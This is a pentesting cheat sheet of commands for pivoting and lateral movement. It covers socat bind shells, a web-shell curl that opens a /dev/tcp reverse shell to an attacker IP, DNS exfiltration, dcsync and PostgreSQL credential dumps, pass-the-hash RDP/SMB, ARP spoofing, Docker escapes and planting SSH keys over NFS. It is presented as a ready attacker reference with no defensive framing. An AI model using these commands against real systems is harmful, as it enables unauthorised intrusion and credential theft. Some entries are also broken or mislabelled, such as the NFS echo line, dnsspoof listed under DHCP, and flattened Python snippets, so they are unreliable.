# Pivoting and Network Exploration

#### Using NetCat
- **Create a simple relay using NetCat to forward traffic between local and remote ports:**
	```bash
	nc -lvp <local_port> -c "nc <target_ip> <remote_port>"
	```
  
#### Using SoCat
- **`socat` Port forward for Bidirectional Communication:**
	```bash
	socat TCP4-LISTEN:<local_port>,fork TCP4:<remote_host>:<remote_port>
	```
- **`socat` Encrypted Tunnel:**
	```bash
	socat OPENSSL-LISTEN:<local_port>,cert=<cert.pem>,key=<key.pem>,verify=0 TCP:<target_ip>:<remote_port>
	```
- **`socat` Reverse Shell:**
	```bash
	socat TCP4-LISTEN:<local_port>,fork,bind=127.0.0.1 EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane
	```
- **`socat` Reverse Shell Listener:**
	```bash
	socat TCP4-LISTEN:<local_port>,fork EXEC:/bin/bash
	```

#### Using ProxyChains 
- **`proxychains` Tunnel Nmap:**
	```bash
	proxychains nmap -sT <internal_ip>
	```
- **`proxychains` Tunnel SSH:**
	```bash
	proxychains ssh <target_user>@<internal_ip>
	```

#### Tunneling with Chisel
- **Start Chisel Server on Attack Host:**
	```bash
	./chisel server --reverse --port <local_port>
	```
- **Reverse Port Forward through Chisel Tunnel on Target Host:**
	```bash
	./chisel client <attack_ip>:<local_port> R:<local_port>:<target_ip>:<remote_port>
	```

#### Using Metasploit for Pivoting
- **Set Up a Meterpreter Session for Pivoting:**
	```bash
	use exploit/multi/handler
	set PAYLOAD windows/meterpreter/reverse_tcp
	set LHOST <your_ip>
	set LPORT <your_port>
	exploit
	```
- **Route Traffic Through a Meterpreter Session:**
	```bash
	meterpreter> run autoroute -s <network_range>
	meterpreter> run portfwd add -l <local_port> -p <remote_port> -r <target_ip>
	```

# Lateral Movement via Standard Protocols

#### ICMP
- **Using `icmpsh` Server (attacker):**
	```bash
	icmpsh -t <target_ip> -d <attack_ip>
	```
- **Using `icmpsh` Client (target):**
	```bash
	icmpsh-m -t <attack_ip> -c <command>
	```

#### FTP 
- **FTP Connection:**
	```bash
	ftp <target_ip>
	```
- **FTP Pivoting via SSH:**
	```bash
	ssh -L <local_port>:<target_ip>:21 <username>@<pivot_host>
	```

#### TFTP (Trivial File Transfer Protocol)
- **Download a File from a TFTP Server:**
	```bash
	tftp <target_ip> tftp> get remote_file
	```
- **Upload a File to a TFTP Server:**
	```bash
	tftp <target_ip> tftp> put local_file
	```

#### SSH
- **SSH Tunneling (Dynamic Port Forwarding - SOCKS Proxy):** Set up a SOCKS proxy on the local machine that forwards all traffic through the SSH connection to the target machine. Useful for browsing internal networks.
	```bash
	ssh -D <local_port> <username>@<pivot_ip>
	```
- **SSH Tunneling (Local Port Forwarding):** Forward traffic from a local port to a remote service on the target machine. Useful for accessing services hidden behind a firewall
	```bash
	ssh -L <local_port>:<remote_ip>:<remote_port> <username>@<pivot_ip>
	```
- **SSH Tunneling (Remote Port Forwarding):** Expose a local service (on the attacker's machine) to the target's network.
	```bash
	ssh -R <remote_port>:<local_ip>:<local_port> <username>@<pivot_ip>
	```
- **SSH Pivoting Using ProxyJump:** Jump through an intermediary system to reach the target host, leveraging compromised SSH credentials
	```bash
	ssh -J <pivot_ip> <username>@<target_ip>
	```
- **SSH Pivoting with ProxyChains:**
	```bash
	proxychains ssh <username>@<target_ip>
	```
- **Enable X11 Forwarding Over SSH:**
	```bash
	ssh -X <username>@<target_ip>
	```
- **Execute GUI Applications Remotely:**
	```bash
	ssh -X <username>@<target_ip> xclock
	```
- **Check for Trust Relationships in `.ssh/authorized_keys`:**
	```bash
	cat ~/.ssh/authorized_keys
	```
- **Move Laterally Using SSH Trust Relationships:**
	```bash
	ssh -i ~/.ssh/id_rsa <username>@<target_ip>
	```
- **List SSH Agent Forwarding Sockets:**
	```bash
	env | grep SSH_AUTH_SOCK
	```
- **Use SSH Agent Forwarding to Access Other Hosts:**
	```bash
	ssh -A <username>@<target_ip>
	```
- **Execute Commands Remotely via SSH:**
	```bash
	ssh <username>@<target_ip> 'command_to_run'
	```
- **Run a Script on a Remote Host:**
	```bash
	ssh <username>@<target_ip> 'bash -s' < local_script.sh
	```
- **Transfer Files to a Remote Host Using `scp`:**
	```bash
	scp /path/to/local_file <username>@<target_ip>:/path/to/remote_directory
	```
- **Retrieve Files from a Remote Host Using `scp`:**
	```bash
	scp <username>@<target_ip>:/path/to/remote_file /path/to/local_directory
	```

#### Telnet
- **Telnet Connection:**
	```bash
	telnet <target_ip> <target_port>
	```

#### DNS
- **Using `dns2tcp` Server (attacker):**
	```bash
	dns2tcpd -F /etc/dns2tcpd.conf
	```
- **Using `dns2tcp` Client (target):**
	```bash
	dns2tcpc -r <file> -z <attack_ip>
	```
- **DNS Queries with `dig`:**
	```bash
	dig @<dns_server> <data_to_exfil>.domain.com
	```

#### HTTP/HTTPs

- **HTTP Pivoting using SSH:**
	```bash
	ssh -L <local_port>:<target_ip>:<target_port> <user>@<pivot_host>
	```
- **Pivoting through Web Shells:**
	````bash
	curl http://<target_ip>/webshell?cmd=<command>
	````
- **Reverse SSH through Web Exploit:**
	```bash
	curl http://<target_ip>/webshell?cmd=bash+-i+>&+/dev/tcp/<attack_ip>/<attack_port>+0>&1
	```

#### NTP
- **Query NTP Server for Information:**
	```bash
	ntpdate -q <target_ntp_server>
	```
- **Synchronize Time with NTP:**
	```bash
	sudo ntpdate <target_ntp_server>
	```

#### SNMP
- **Enumerate SNMP Information:**
	```bash
	snmpwalk -v 2c -c public <target_ip>
	```
- **Set SNMP Values Remotely:**
	```bash
	snmpset -v 2c -c private <target_ip> .1.3.6.1.2.1.1.5.0 s "new_value"
	```

#### SMB
- **SMBClient List SMB Shares:**
	```bash
	smbclient -L //<target_ip> -U <username>
	```
- **SMBClient Connect to SMB:**
	```bash
	smbclient //<target_ip>/share -U <username>
	```
- **SMBClient Connect via Username and Password:**
	```bash
	smbclient //<target_ip>/<share_name> -U <username>%<password>
	```
- **SMBClient Connect via Username and Hash:**
	```bash
	smbclient //<target_ip>/<share_name> -U <username>%<NTLM_hash>
	```
- **SMBClient Upload File to Writable SMB Share for Execution:**
	```bash
	smbclient //target_ip/share -U <username> -c 'put /local/path/to/exploit /remote/path/on/share'
	```
- **Mount SMB Shares Locally:**
	```bash
	mount -t cifs //<target_ip>/<share_name> /mnt -o username=<username>,password=<password>
	```
- **Enum4Linux Scan and Enumerate :**
	```bash
	enum4linux -a <target_ip>
	```
- **SMBMap Scan and Enumerate Recursively:**
	```bash
	smbmap -H <target_ip> -R
	```
- **SMBMap Find Writable Shares:**
	```bash
	smbmap -H <target_ip> --shares
	```

#### NFS
- **List Available NFS Shares:**
	```bash
	showmount -e <target_ip>
	```
- **Mount an NFS Share Locally:**
	```bash
	sudo mount -t nfs <target_ip>:/path/to/share /mnt
	```
- **Copy Files from NFS to Local System:**
	```bash
	cp /mnt/remote_file /path/to/local_directory
	```
- **View export rules for NFS shares:**  Check access permissions and identify writable directories.
	```bash
	cat /etc/exports
	```
- **Mount an NFS share with the `nolock` option to bypass file locks:**
	```bash
	mount -o nolock <target_ip>:/nfs_share /mnt
	```
- **Write an SSH public key to a writable NFS share to enable lateral movement:**
	```bash
	echo 'echo "<your_public_key>" > /mnt/home/user/.ssh/authorized_keys'
	```
- **Switch to a user that matches the UID on the NFS server to access files as that user on the mounted share:**
	```bash
	su <username>
	```

#### RDP
- **RDesktop Connect via Username and Password:**
	```bash
	rdesktop -u <username> -p <password> <target_ip>
	```
- **XFreeRDP Connect via Username and Password:**
	```bash
	xfreerdp /v:<target_ip> /u:<username> /p:<password>
	```
- **XFreeRDP Connect via Username and Hash:**
	```bash
	xfreerdp /v:<target_ip> /u:<username> /pth:<NTLM_hash> 
	```
- **RDesktop Check Active RDP Sessions:**
	```bash
	xrdp-sesadmin --status
	```
- **Tunnel RDP Over SSH:**
	```bash
	ssh -L 3389:<target_ip>:3389 <username>@<pivot_ip> xfreerdp /v:localhost /u:<username> /p:<password> 
	```

#### MySQL
- **Connect to a remote MySQL instance if credentials are known:**
	```bash
	mysql -u <username> -h <target_ip> -p
	```
- **Check the user's privileges on the MySQL server:**
	```bash
	mysql -e "SHOW GRANTS FOR <username>@<target_host>"
	```
- **List available databases on the remote MySQL server:**
	```bash
	mysql -e "SHOW DATABASES"
	```
- **Exploit MySQL's ability to read files on the remote system:**
	```bash
	mysql -e "SELECT load_file('/etc/passwd')"
	```

#### PostgreSQL
- **Connect to a remote PostgreSQL server using stolen credentials:**
	```bash
	psql -h <target_ip> -U <username>
	```
- **List all databases on the remote PostgreSQL server:**
	```sql
	\list
	```
- **Dump PostgreSQL user credentials to a file on the server:**
	```sql
	COPY (SELECT passwd FROM pg_shadow) TO '/tmp/shadow'; 
	```

#### Rsync
- **Copy files from the target machine via rsync (requires rsync to be configured):**
	```bash
	rsync <target_ip>::module /destination
	```
- **Synchronize directories from a remote system:**
	```bash
	rsync -avz <target_ip>::/ <local_directory>
	```
- **Use a password file to authenticate and sync files via rsync:**
	```bash
	rsync --password-file=/path/to/password-file <target_ip>::/ <local_directory>
	```

#### RSH
- **Remotely execute commands on the target host using RSH (if configured):**
	```bash
	rsh <target_host> -l <username>
	```
- **Log into the target host using RSH (if configured):**
	```bash
	rlogin <target_host> -l <username>
	```

#### RCP
- **Copy files from the target machine using the remote copy (rcp) command:**
	```bash
	rcp <username>@<target_ip>:/path/to/file /local/destination
	```
  
# Lateral Movement via Non-Standard Protocols

#### Exploiting DHCP
- **Spoof DHCP Server:**
	```bash
	sudo dnsspoof -i eth0
	```
- **Inject Malicious DHCP Options:**
	```bash
	sudo dhcpstarv -i eth0 -o "option:router,<attacker_ip>"
	```

#### Exploiting VRRP (Virtual Router Redundancy Protocol)
- **Send VRRP Packets to Change Master Router:**
	```bash
	scapy send(IP(dst="224.0.0.18")/VRRP(prio=255))
	```

# Lateral Movement via Service Exploitation

####  Exploiting Printers for Lateral Movement
- **Enumerate Network Printers:**
	```bash
	lpstat -t
	```
- **Print a Malicious Document on a Remote Printer:**
	```bash
	lp -d <printer_name> /path/to/malicious_doc.pdf
	```

#### Using Docker for Lateral Movement
- **List Running Docker Containers on a Host:**
	```bash
	sudo docker ps -a
	```
- **Spawn an interactive shell within a running Docker container:**
	```bash
	sudo docker exec -it <container_id> /bin/bash
	```
- **Check if the container is running with elevated privileges (`privileged: true`):**
	```bash
	docker inspect <container_id>
	```
- **Escape from a Docker container to the host system if the container is running with elevated privileges:**
	```bash
	docker run --rm -v /:/mnt --privileged debian chroot /mnt bash
	```
- **Check if the Docker socket is world-writable:**
	```bash
	ls -l /var/run/docker.sock
	```
- **Use the Docker socket to mount the entire host filesystem into a container for lateral movement:**
	```bash
	docker -H unix:///var/run/docker.sock run -v /:/host -i -t ubuntu chroot /host bash
	```

#### Leveraging Kubernetes for Lateral Movement
- **List Kubernetes Pods in a Cluster:**
	```bash
	kubectl get pods --all-namespaces
	```
- **Execute Commands Inside a Kubernetes Pod:**
	```bash
	kubectl exec -it <pod_name> -- /bin/bash
	```

#### VNC Pivoting
- **Connects to a VNC server on a remote host:**
	```bash
	vncviewer <target_ip>:<port>
	```

#### Automate Telnet Commands with `expect`
- **Automate Telnet Commands with `expect`:**
	```bash
	expect -c " spawn telnet <target_ip> expect "login:" send \"user\r\" expect "Password:" send \"password\r\" interact "
	```

# ARP Spoofing for Lateral Movement

#### ARP Cache Poisoning
- **Perform an ARP spoof attack to redirect network traffic between the target and the gateway:**
	```bash
	arpspoof -i <interface> -t <target_ip> <gateway_ip>
	```
- **Perform ARP poisoning using Ettercap to intercept traffic:**
	```bash
	ettercap -T -M arp:remote /<target_ip>/ /<gateway_ip>/
	```

#### ARP Manipulation with iptables
- **Set up a man-in-the-middle attack by redirecting traffic intended for one machine to another:**
	```bash
	iptables -t nat -A PREROUTING -p tcp --dport 22 -j DNAT --to-destination <target_ip>:<port>
	```

# Lateral Movement via Active Directory

#### Exploiting LLMNR/NBNS
- **Exploit LLMNR/NBNS Using `responder`:**
	```bash
	sudo responder -I eth0 -rdw
	```

#### Abuse of Active Directory Trusts
- **Enumerate Domain Trusts Using `PowerView`:**
	```bash
	Get-DomainTrust
	```
- **Move Laterally Using Inter-Domain Trusts:**
	```bash
	Enter-PSSession -ComputerName <target_ip> -Credential <trusted_domain>\<user>
	```

#### Exploiting Active Directory with `Impacket`
- **Run a `dcsync` Attack to Dump Credentials:**
	```bash
	secretsdump.py -just-dc-ntlm <domain>/<user>@<domain_controller_ip>
	```
- **Execute Commands on Remote AD Machines Using `wmiexec.py`:**
	```bash
	wmiexec.py <domain>/<user>:<password>@<target_ip>
	```

#### LDAP Exploitation
- **Enumerate LDAP Users:**
	```bash
	ldapsearch -x -h <ldap_server_ip> -b "dc=example,dc=com" "(objectClass=user)"
	```
- **Use LDAP to Access Other Services:**
	```bash
	ldapsearch -x -h <ldap_server_ip> -b "dc=example,dc=com" "(|(userPrincipalName=user@domain.com)(mail=user@domain.com))"
	```

#### VPN Pivoting
- **Set Up a VPN on a Compromised Host:**
	```bash
	openvpn --config /path/to/config.ovpn
	```
- **Route Traffic from a Remote Network Through VPN:**
	```bash
	sudo ip route add <target_network> via <vpn_gateway>
	```

# Lateral Movement via Cloud

#### Moving Laterally in AWS
- **Enumerate EC2 Instances Using AWS CLI:**
	```bash
	aws ec2 describe-instances --query "Reservations[*].Instances[*].InstanceId"
	```
- **Access Another AWS Account via AssumeRole:**
	```bash
	aws sts assume-role --role-arn "arn:aws:iam::<account_id>:role/<role_name>" --role-session-name AWSCLI-Session export AWS_ACCESS_KEY_ID=<access_key> export AWS_SECRET_ACCESS_KEY=<secret_key> export AWS_SESSION_TOKEN=<session_token>
	```

#### Moving Laterally in Azure
- **Enumerate Virtual Machines in Azure:**
	```bash
	az vm list --query "[].{name:name,resourceGroup:resourceGroup}" --output table
	```
- **Connect to an Azure VM Using RDP:**
	```bash
	xfreerdp /u:user /p:password /v:<vm_public_ip>
	```

#### Exploiting IAM Roles for Lateral Movement
- **List IAM Roles in AWS:**
	```bash
	aws iam list-roles --query 'Roles[*].RoleName'
	```
- **Move Laterally by Assuming Another Role:**
	```bash
	aws sts assume-role --role-arn "arn:aws:iam::<account_id>:role/<role_name>" --role-session-name <session_name>
	```

# Lateral Movement via Custom Scripting and Automation 

#### Bash Scripting for Automated Movement
- **Automate SSH Connections Across Multiple Hosts:**
	```bash
	for host in $(cat hosts.txt); do ssh user@$host 'command_to_run'; done
	```
- **Automate File Transfers with SCP:**
	```bash
	for host in $(cat hosts.txt); do scp /path/to/file user@$host:/path/to/destination; done
	```

#### Python Scripting for Lateral Movement
- **Automate Remote Command Execution via Paramiko:**
	```bash
	import paramiko  client = paramiko.SSHClient() client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) client.connect('target_ip', username='user', password='password') stdin, stdout, stderr = client.exec_command('command_to_run') print(stdout.read().decode()) client.close()
	```
- **Automate SMB Connections with `smbprotocol`:**
	```bash
	from smbprotocol.connection import Connection from smbprotocol.open import Open  conn = Connection(uuid.uuid4(), "target_ip") conn.connect() tree = conn.session.connect_tree("share") file = Open(tree, "file.txt", "wb") file.write(b"Hello, world!") file.close() conn.disconnect()
	```

#### Using `expect` for Automation
- **Automate SSH Login and Command Execution with `expect`:**
	```bash
	expect -c " spawn ssh user@<target_ip> expect \"password:\" send \"password\r\" expect \"$ \" send \"command_to_run\r\" interact "
	```
